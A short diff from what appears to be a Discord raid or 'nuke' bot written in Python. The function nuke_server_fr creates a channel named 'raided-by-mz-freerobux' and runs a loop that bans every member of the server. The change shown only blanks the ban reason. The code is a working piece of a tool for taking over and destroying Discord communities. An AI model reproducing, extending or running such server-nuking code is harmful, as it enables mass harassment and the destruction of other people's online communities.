@@ -200,7 +200,7 @@ async def nuke_server_fr(ctx):
         newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
 
         async def ban(ctx, member: discord.User = None, reason=None):
-            await ctx.guild.ban(member, reason=reason)
+            await ctx.guild.ban(member, reason='')
 
         for member in all_members_list:
             try:
